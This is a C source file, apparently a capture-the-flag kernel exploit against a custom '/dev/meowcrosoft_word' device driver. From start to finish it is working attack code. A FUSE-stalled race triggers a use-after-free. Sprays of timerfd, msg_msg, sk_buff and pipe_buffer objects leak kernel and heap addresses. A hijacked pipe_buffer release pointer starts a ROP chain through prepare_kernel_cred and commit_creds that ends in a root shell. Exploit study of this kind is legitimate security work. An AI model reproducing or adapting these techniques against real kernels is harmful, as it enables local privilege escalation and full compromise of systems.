#define _GNU_SOURCE
#define FUSE_USE_VERSION 30
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <poll.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <fuse.h>
#include <time.h>
#include <sys/fcntl.h> 
#include <sys/socket.h>
#include <sys/wait.h>
#include <assert.h>
#include <sys/msg.h>
#include <arpa/inet.h>
#include <sys/timerfd.h>
#include <limits.h>

// gcc exploit.c -o exploit -D_FILE_OFFSET_BITS=64 `pkg-config fuse --cflags --libs` -pthread --static

#define DO_CREATE 0xc010ca00 
#define DO_WRITE  0xc010ca01
#define DO_READ   0xc010ca02
#define DO_FREE	  0xc010ca03

// GLOBAL VARIABLES
char buf[0x3000];
int fd;
void * addr_write1; // mmapped address for FUSE write1
void * addr_write2; // mmapped address for FUSE write2
char file_buffer[4096];	

// VARIABLES TO STORE LEAKS
int corrupted_idx = -1;
int next_idx = -1;
uint64_t kernel_leak;
uint64_t kernel_base;
uint64_t heap_addr = 0; // kheap 1024 address
uint64_t heap_prev = 0; // prev 
uint64_t kheap_pt1 = 0; // another next
uint64_t kheap_pt2 = 0; // another prev

// SAVE STATE 
unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[+] Saved state");
}

// GET SHELL
void get_shell(void) {
    puts("[+] Returned to userland");
    if (getuid() == 0){
        printf("[+] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}
unsigned long user_rip = (unsigned long)get_shell;

// FUSE pipes to sync with exploit
int fuse_pipe1[2];
int fuse_1_2_sync[2];
int fuse_pipe2[2];
int fuse_write2_data[2];

// KERNEL MODULE STUFF
struct req { // ioctl struct input by user
    uint64_t size;
    uint64_t addr;
};

int create_doc(char * buf, uint64_t len) {
    struct req req; 
    req.size = len; 
    req.addr = buf;
    
    if (ioctl(fd, DO_CREATE, &req) < 0) {
        perror("[!] Create failed");
        return -1;
    }
    printf("[+] Created new doc\n");
    return 0;
}

int write_doc(char * buf, uint64_t len) {
    struct req req; 
    req.size = len;
    req.addr = buf; 
    
    if (ioctl(fd, DO_WRITE, &req) < 0) {
        perror("[!] Write failed");
        return -1;
    }
    printf("[+] Performed write\n");
    return 0;
}

int read_doc(char * buf, uint64_t len) {
    struct req req; 
    req.size = len; 
    req.addr = buf; 
    
    if (ioctl(fd, DO_READ, &req) < 0) {
        perror("[!] Read failed");
        return -1;
    }
    printf("[+] Performed read\n");
    return 0;
}

int free_doc(void) {
    struct req req; 
    req.size = 0; 
    req.addr = NULL; 
    
    if (ioctl(fd, DO_FREE, &req) < 0) {
        perror("[!] Free failed");
        return -1;
    }
    printf("[+] Performed free\n");
    return 0;
}

// MSG_MSG STUFF
#define NUM_MSQIDS 2200
#define MSG_TAG 0X41424344
#define MSG_MSG_SIZE (sizeof(struct msg_msg))
#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))
#define PAGE_SIZE 0x1000
int msqid[NUM_MSQIDS];

struct msg_msg {
    uint64_t m_list_next;
    uint64_t m_list_prev;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
};

struct msg_msgseg {
    uint64_t next;
};

struct {
  long mtype;
  char mtext[256 - MSG_MSG_SIZE];
} message; // Primary message of size 256

struct {
  long mtype;
  char mtext[1024 - MSG_MSG_SIZE];
} msg_secondary;

struct {
  long mtype;
  char mtext[0x960];
} message_leak;

void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {
    msg->m_list_next = m_list_next;
    msg->m_list_prev = m_list_prev;
    msg->m_type = 0x42;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = 0;
}

// PIPE BUFFER STUFF
#define NUM_PIPEFDS 256
int pipefd[NUM_PIPEFDS][2];

struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

// SOCKET/SKBUFF STUFF
#define NUM_SOCKETS 4
#define NUM_SKBUFFS 128
#define SKB_SHARED_INFO_SIZE 0x140
int s;
int ss[NUM_SOCKETS][2];
char secondary_buf[1024 - SKB_SHARED_INFO_SIZE];

// TIMERFD STUFF
#define NUM_TIMERFDS 4096
int timerfds[NUM_TIMERFDS];
struct itimerspec timerValue;

// FUSE STUFF
static int do_getattr(const char *path, struct stat *st) {
	printf("[getattr] Called\n");
	printf("\tAttributes of %s requested\n", path);
	
	st->st_uid = getuid();
	st->st_gid = getgid(); 
	st->st_atime = time( NULL ); 
	st->st_mtime = time( NULL ); 
	
	if (strcmp(path, "/") == 0) {
		st->st_mode = S_IFDIR | 0755;
		st->st_nlink = 2; 
	}
	else {
		st->st_mode = S_IFREG | 0644;
		st->st_nlink = 1;
		st->st_size = 1024;
	}
	return 0;
}

static int do_readdir(const char *path, void *buffer, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi) {
	printf("--> Getting The List of Files of %s\n", path);
	
	filler(buffer, ".", NULL, 0); // Current Directory
	filler(buffer, "..", NULL, 0); // Parent Directory
	
	if (strcmp(path, "/") == 0 ) {
		filler(buffer, "write1", NULL, 0);
		filler(buffer, "write2", NULL, 0);
	}
	return 0;
}

static int do_read(const char *path, char *buffer, size_t size, off_t offset, struct fuse_file_info *fi) {
	dprintf(666, "--> Trying to read %s, %u, %u\n", path, offset, size);
	char lolText[0x200];
	uint64_t write1[0x100];
    	char *selectedText = NULL;
	char signal;
	
	if (strcmp(path, "/write1") == 0) {
	    memset(write1, 0, sizeof(write1));
	    write1[0] = 0x4242424242424242;
	    write1[1] = 0x4242424242424242;
	    write1[2] = 0x4343434343434343; 
	    write1[3] = 0x960;
		selectedText = write1;
		dprintf(666, "[+] Blocking FUSE read thread\n");
		read(fuse_pipe1[0], &signal, 1);
		dprintf(666, "[+] Unblocked FUSE read thread\n");
    	}
	else if (strcmp(path, "/write2") == 0) {
        	dprintf(666, "[+] Blocking FUSE read thread\n");
        	memset(lolText, 0, sizeof(lolText));
        	read(fuse_pipe2[0], &signal, 1);
        	read(fuse_write2_data[0], &lolText, 0x18);
        	selectedText = lolText;
        	dprintf(666, "[*] From FUSE: %llx\n", ((uint64_t *) selectedText)[0]);
        	dprintf(666, "[*] From FUSE: %llx\n", ((uint64_t *) selectedText)[1]);
        	dprintf(666, "[*] From FUSE: %llx\n", ((uint64_t *) selectedText)[2]);
		dprintf(666, "[+] Unblocked FUSE read thread\n");
    	}
	else {
		return -1;
    	}
	memcpy(buffer, selectedText + offset, size);
	return 0x100 - offset;
}

static struct fuse_operations operations = {
    .getattr	= do_getattr,
    .readdir	= do_readdir,
    .read	= do_read,
};

void fuse_setup_fn(void) {
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan *chan;
    struct fuse *fuse;
    
    if (mkdir("/tmp/fuse_dir", 0777)) {
        perror("[!] mkdir FUSE failed");
        exit(-1);
    }
    
    if (!(chan = fuse_mount("/tmp/fuse_dir", &args))) {
        perror("[!] fuse_mount failed");
        exit(-1);
    }
                                                                                          
    if (!(fuse = fuse_new(chan, &args, &operations, sizeof(operations), NULL))) {
        fuse_unmount("/tmp/fuse_dir", chan);
        perror("[!] Setup failed");
        exit(-1);
    }
    
    fuse_set_signal_handlers(fuse_get_session(fuse));
    fuse_loop_mt(fuse);
}

// EXPLOIT STUFF 
static void * write1_thread(void *arg) {
    dup2(1, 667);
    dprintf(667, "[+] Entered write1 thread\n");
    // Free the vulnerable object
    free_doc(); 
    
    // Spray timerfd objects
    printf("[+] Spraying timerfd\n");
    for (int i = 0; i < NUM_TIMERFDS; i++) {
        timerfds[i] = timerfd_create(CLOCK_REALTIME, 0); 
        timerValue.it_value.tv_sec = 1;
        timerValue.it_value.tv_nsec = 0;
        timerValue.it_interval.tv_sec = 1;
        timerValue.it_interval.tv_nsec = 0;
        timerfd_settime(timerfds[i],  0, &timerValue, NULL); 
    }   
    sleep(1);
    
    // Read and leak kernel text 
    memset(buf, 0, sizeof(buf));
    read_doc(buf, 256);
    
    kernel_leak = ((unsigned long *)buf)[5];
    printf("[+] Kernel text leak: %llx\n", kernel_leak);
    kernel_base = kernel_leak - 0x2e91e0;
    printf("[+] Kernel text base: %llx\n", kernel_base);
    
    // Free timerfd objects
    printf("[+] Freeing timerfd spray\n");
    for (int i = 0; i < NUM_TIMERFDS; i++) {
        close(timerfds[i]);
    }
    
    // Spray msg_msg to cross cache
    dprintf(667, "[+] Spraying primary msg_msg objects\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&message, 0, sizeof(message));
        *(long *)&message.mtype = 0x41;
        *(int *)&message.mtext[0] = MSG_TAG;
        *(int *)&message.mtext[4] = i;
        if (msgsnd(msqid[i], &message, sizeof(message) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    dprintf(667, "[+] Spraying secondary msg_msg objects\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_secondary, 0, sizeof(msg_secondary));
        *(long *)&msg_secondary.mtype = 0x42;
        *(int *)&msg_secondary.mtext[0] = MSG_TAG;
        *(int *)&msg_secondary.mtext[4] = i;
        if (msgsnd(msqid[i], &msg_secondary, sizeof(msg_secondary) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    // Unblock FUSE 
    write(fuse_pipe1[1], "A", 1);
    write(fuse_1_2_sync[1], "A", 1);
    dprintf(667, "[+] Finished write1 thread\n");
}

static void * write2_thread(void *arg) {
    dup2(1, 668); 
    dprintf(668, "[+] Entering write2 thread\n");    
    
    // Create thread for write1
    printf("[+] Creating thread for write1\n");
    pthread_t thr;
    int b = pthread_create(&thr, NULL, write1_thread, NULL); 
    if(b != 0) {
        perror("pthread_create");
        exit(-1);
    }
    
    write_doc(addr_write1, 0x20); // Trigger and block 
    sleep(1);
    
    char signal;
    read(fuse_1_2_sync[0], &signal, 1); // Block until write1 is done
    
    // Read from msg_msg
    printf("[+] Finding corrupted message\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if (msgrcv(msqid[i], &message_leak, sizeof(message_leak) - sizeof(long), 0, MSG_COPY | IPC_NOWAIT) < 0) {
            perror("[!] msgrcv failed");
            exit(-1);
        }
        if (*(int *)&message_leak.mtype != 0x41) {
            corrupted_idx = i;
            break;
        }
    }
    if (corrupted_idx == -1) {
        printf("[!] Failed to find corrupted msg_msg\n"); 
        exit(-1);
    }
    printf("[+] Leaked primary msg_msg contents\n");
    for (int i = 0; i < 106; i++) {
        if (((unsigned long *)message_leak.mtext)[i] == 0x41) {
            heap_addr = ((unsigned long *)message_leak.mtext)[i-2];
            heap_prev = ((unsigned long *)message_leak.mtext)[i-1];
            next_idx = ((unsigned long *)message_leak.mtext)[i+4] >> 32;
            for (int j = 1; j < 300; j++) {
                printf("%d: %llx\n", j, ((unsigned long *)message_leak.mtext)[i+j]); 
                if (((unsigned long *)message_leak.mtext)[i+j] == 0x41) {
                    kheap_pt1 = ((unsigned long *)message_leak.mtext)[i+j-2];
                    kheap_pt2 = ((unsigned long *)message_leak.mtext)[i+j-1];
                }
            }
            break;
        }
    }
    sleep(1); 
    
    printf("[+] kheap 1024 address: %llx\n", heap_addr); // next
    printf("[+] msg_msg prev address: %llx\n", heap_prev); // prev
    printf("[+] corrupted msg_msg idx: %x\n", corrupted_idx); // corrupted idx
    printf("[+] next msg_msg idx: %x\n", next_idx); // next idx
    printf("[+] kheap pt1: %llx\n", kheap_pt1); 
    printf("[+] kheap pt2: %llx\n", kheap_pt2); 
    
    // Check if leak worked properly
    if ((heap_addr == 0) || (heap_prev == 0) || (kheap_pt1 == 0) || (kheap_pt2 == 0)) {
        printf("[!] Leak failed\n");
        exit(-1);
    }
    
    // Build fuse_write2_data 
    memset(buf, 0, sizeof(buf)); 
    ((unsigned long *)buf)[0] = heap_addr;
    ((unsigned long *)buf)[1] = heap_prev;
    ((unsigned long *)buf)[2] = 0x41;
    write(fuse_write2_data[1], &buf, 0x18);
    
    // Unblock FUSE
    write(fuse_pipe2[1], "A", 1);
    dprintf(668, "[+] Finished write2 thread\n");
}

int main(int argc, char *argv[]) {
    // STAGE 1
    printf("STAGE 1: SETUP\n");
    // Initial setup
    printf("[+] Initial setup\n");
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
        perror("sched_setaffinity");
        exit(-1);
    }
    
    // Setting up FUSE pipes to sync exploit
    printf("[+] Setting up pipes\n");
    pipe(fuse_pipe1);
    pipe(fuse_1_2_sync);
    pipe(fuse_pipe2);
    pipe(fuse_write2_data);
    
    // Make FUSE directory
    printf("[+] Making FUSE directory /tmp/fuse_dir\n");
    if (mkdir("/tmp/fuse_dir", 0777)) {
        perror("[!] mkdir FUSE failed");
        exit(-1);
    }
    
    // Start the FUSE filesystem
    printf("[+] Starting FUSE filesystem\n");
    if (!fork()) {
        dup2(1, 666);
        fuse_main(argc, argv, &operations, NULL);
    }
    sleep(1); 
    
    // Open and mmap write1 file on FUSE
    printf("[+] Opening FUSE file write1\n");
    int fuse_fd1; 
    if((fuse_fd1 = open("/tmp/fuse_dir/write1", O_RDWR)) < 0) {
        perror("[!] Failed to open FUSE file");
        exit(-1);
    }
    // mmap the /write1 file
    addr_write1 = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE, fuse_fd1, 0);
    if (addr_write1 == MAP_FAILED) {
        perror("[!] mmap failed");
        exit(-1);
    }
    // Open and mmap write2 file on FUSE
    printf("[+] Opening FUSE file write2\n");
    int fuse_fd2; 
    if((fuse_fd2 = open("/tmp/fuse_dir/write2", O_RDWR)) < 0) {
        perror("[!] Failed to open FUSE file");
        exit(-1);
    }
    // mmap the /write2 file
    addr_write2 = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE, fuse_fd2, 0);
    if (addr_write2 == MAP_FAILED) {
        perror("[!] mmap failed");
        exit(-1);
    }
    
    // Set up sockets
    printf("[+] Setting up sockets\n");
    for (int i = 0; i < NUM_SOCKETS; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
            perror("[!] Socket pair");
            exit(-1);
        }
    }
    
    // Set up message queues
    printf("[+] Setting up msg queues\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
            perror("[!] msgget failed");
            exit(-1);
        }
    }
    
    // Set up pipebuf stuff
    struct pipe_buf_operations *ops;
    struct pipe_buffer *pbuf;

    // Open Meowcrosoft word device
    printf("[+] Opening Meowcrosoft Word device\n");
    if ((fd = open("/dev/meowcrosoft_word", O_RDONLY)) < 0) {
        perror("[!] Failed to open miscdevice");
        exit(-1);
    }
    
    // Initialize buf
    memset(buf, 0, sizeof(buf));
    
    // STAGE 2
    printf("STAGE 2: KERNEL TEXT AND HEAP LEAKS\n");
    // Create doc
    create_doc(buf, 256); 
    
    // Create thread for write2
    printf("[+] Creating thread for write2\n");
    pthread_t thr;
    int b = pthread_create(&thr, NULL, write2_thread, NULL); 
    if(b != 0) {
        perror("pthread_create");
        exit(-1);
    }
    
    write_doc(addr_write2, 0x18); // Trigger and block 
    sleep(1);
    
    // STAGE 3
    printf("STAGE 3: ROP TIME\n");
    // Free the next_idx secondary msg_msg first
    printf("[+] Freeing the next_idx secondary msg_msg\n");
    if (msgrcv(msqid[next_idx], &msg_secondary, sizeof(msg_secondary)-sizeof(long), 0x42, 0) < 0) {
        perror("[!] Free fake msg_msg object failed");
        exit(-1);
    }
    sleep(1);
    
    // Spray sk_buff 
    printf("[+] Spraying sk_buff objects\n");
    memset(secondary_buf, 0, sizeof(secondary_buf));
    build_msg_msg((void *)secondary_buf, kheap_pt1, kheap_pt2, 1024 - MSG_MSG_SIZE, 0);
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            if (write(ss[i][0], secondary_buf, sizeof(secondary_buf)) < 0) {
                perror("[!] write");
                exit(-1);
            }
        }
    }
    
    // Free the secondary message of corrupted_idx
    printf("[+] Freeing the corrupted_idx secondary msg_msg\n");
    if (msgrcv(msqid[corrupted_idx], &msg_secondary, sizeof(msg_secondary)-sizeof(long), 0x42, 0) < 0) {
        perror("[!] Free fake msg_msg object failed");
        exit(-1);
    }
    sleep(1);
    
    // Spray pipe_buf over it
    printf("[+] Spraying pipe_buf over freed 1024 area\n");
    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (pipe(pipefd[i]) < 0) {
            perror("[!] pipe");
            exit(-1);
        }
        if (write(pipefd[i][1], "ABC", 3) < 0) {
            perror("[!] write");
            exit(-1);
        }
    } 
    
    // Free pipe_buffer objects
    printf("[+] Freeing pipe_buffer objects\n");
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0) {
                perror("[!] read");
                exit(-1);
            }
        }
    }

    save_state();

    // ROP stuff
    memset(secondary_buf, 0, sizeof(secondary_buf));
    pbuf = (struct pipe_buffer *)&secondary_buf;
    pbuf->ops = heap_addr + 0x290;
    ops = (struct pipe_buf_operations *)&secondary_buf[0x290];
    ops->release = kernel_base + 0x60ecea; // 0xffffffff8160ecea : push rsi ; jmp qword ptr [rsi + 0x39]
    
    // prepare_kernel_cred: 0xffffffff810ba280
    // commit_creds: 0xffffffff810b9ff0
    // init_task: 0xffffffff82a0c900
    
    uint64_t *rop;
    rop = (uint64_t *)&secondary_buf[0x39];
    *rop = kernel_base + 0x02ba00; // 0xffffffff8102ba00 : pop rsp ; ret
    
    rop = (uint64_t *)&secondary_buf[0x0];
    *rop = 0xdeadbeefcafebabe;
    *rop++ = kernel_base + 0x4cf160; // ret 0x100;
    *rop++ = kernel_base + 0x426; // ret
    
    rop = (uint64_t *)&secondary_buf[0x178];
    *rop = kernel_base + 0x6615f; // pop rdi ; pop 5 ; ret
    *rop++ = kernel_base + 0x6615f; // pop rdi ; pop 5 ; ret
    
    rop = (uint64_t *)&secondary_buf[0x110];
    *rop = 0x4141414142424242;
    *rop++ = kernel_base + 0x6615f; // pop rdi ; pop 5 ; ret
    *rop++ = kernel_base + 0x1a0c900; // init_task
    *rop++ = 0x4141414141414141;
    *rop++ = 0x4141414141414141;
    *rop++ = 0x4141414141414141;
    *rop++ = 0x4141414141414141;
    *rop++ = 0x4141414141414141;
    *rop++ = kernel_base + 0x0ba280; // prepare_kernel_cred 
    *rop++ = kernel_base + 0x034df3; // pop rcx ; ret
    *rop++ = heap_addr + 0x178; 
    *rop++ = kernel_base + 0x3c72a7; // push rax ; jmp qword ptr [rcx]
    *rop++ = 0x4141414141414141;
    *rop++ = 0x4242424242424242;
    *rop++;
    *rop++ = 0x4444444444444444;
    *rop++ = 0x4545454545454545;
    *rop++ = kernel_base + 0x0b9ff0; // commit_creds
    *rop++ = kernel_base + 0xe97d68; // swapgs
    *rop++ = kernel_base + 0x037bc3; // iretq
    *rop++ = user_rip;
    *rop++ = user_cs; 
    *rop++ = user_rflags;
    *rop++ = user_sp;
    *rop++ = user_ss; 
    
    // 0xffffffff81e97d68 : swapgs ; ret
    // 0xffffffff81037bc3 <do_sync_core+35>:        iretq
    // 0xffffffff814cf160 : ret 0x100
    // 0xffffffff8106615f : pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret
    // 0xffffffff81034df3 : pop rcx ; ret
    // 0xffffffff813c72a7 : push rax ; jmp qword ptr [rcx]
    // 0xffffffff81325a3d : pop rdi ; xor eax, 0x8948ffef ; ret
    
    signal(SIGSEGV, get_shell);
    
    // Spray pipe_buf objects
    printf("[+] Spraying fake pipe_buffer objects\n");
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            if (write(ss[i][0], secondary_buf, sizeof(secondary_buf)) < 0) {
                perror("[!] write");
                exit(-1);
            }
        }
    }
    
    printf("[+] Releasing pipe_buffer objects\n");
    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (close(pipefd[i][0]) < 0) {
            perror("[!] close");
            exit(-1);
        }
        if (close(pipefd[i][1]) < 0) {
            perror("[!] close");
            exit(-1);
        }
    } 

    return 0;
}









